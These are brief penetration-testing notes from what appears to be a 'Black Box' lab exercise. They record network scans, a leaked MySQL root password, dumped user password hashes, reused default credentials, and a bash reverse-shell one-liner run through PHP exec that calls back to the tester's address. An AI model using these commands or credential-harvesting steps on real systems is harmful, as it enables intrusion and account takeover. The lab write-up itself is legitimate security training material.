Blackbox 2 Notes

# Black Box 2 Notes

My IP: `172.16.64.10`
Target subnet: 172.16.64.0/24

Let's ping scan target subnet for up IPs.
`nmap -n -sn 172.16.64.0/24 -oG - | awk '/Up$/{print $2}'`

Results:
```
172.16.64.81
172.16.64.91
172.16.64.92
172.16.64.166
```
### 172.16.64.81
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
MySQL on port 13306
- `MySQL 5.7.25-0ubuntu0.16.04.2`
- X-DB-Key: `x41x41x412019!`
- X-DB-User: `root`
- X-DB-name: `mysql`

**Flag found via SQL login**:
```
MySQL [cmsbase]> select id,content from flag;
+----+------------------------------+
| id | content                      |
+----+------------------------------+
|  1 | Congratulations, you got it! |
+----+------------------------------+
```

Other creds found via SQL:
```
MySQL [cmsbase]> select user,password,name,email from tbl_users;
+---------+--------------------------------------------------------------+---------+-------------------+
| user    | password                                                     | name    | email             |
+---------+--------------------------------------------------------------+---------+-------------------+
| foocorp | $2a$08$f2fG8Ncpmj815xQ9U3Ylh.uD0VW/X6kOgjPIEHKP547jspS0FlHF6 | foocorp | admin@foocorp.io  |
| mickey  | $2a$08$w/oljwDbODAThUR4HTVO8eUjTabE80sH0i6xnOR97ZXfsGGmxohAW | mickey  | mickey@foocorp.io |
| donald  | $2a$08$dK04y0KEURxDv02vYRab1OMYMSWbW/bpGF.eAWrWv9JAGaa4yTxlq | donald  | donald@foocorp.io |
+---------+--------------------------------------------------------------+---------+-------------------+
```

/webapp/ subdomain found!
#### /webapp/robots.txt:
```
User-agent: *
Disallow: /assets/
Disallow: /css/
Disallow: /emails/
Disallow: /img/
Disallow: /includes/
Disallow: /install/
Disallow: /lang/
Disallow: /sociallogin/
Disallow: /templates/
Disallow: /upload/
```
---

### 172.16.64.91
```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
DNS: 75ajvxi36vchsv584es1.foocorp.io.
No subdomains found.
Able to upload PHP reverse shell.
### 172.16.64.92
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  dnsmasq 2.75
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
63306/tcp open  unknown  
```
Seems like this is the best bet for initial exploitation.
No subdomains found.
63306 is MySQL?
Ran PHP reverse shell in admin console:
`exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.64.10/1234 0>&1'");`
**Flag found!**
### 172.16.64.166
```
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
Exploited using `sabrina:CHANGEME` creds.
**Flag found!**
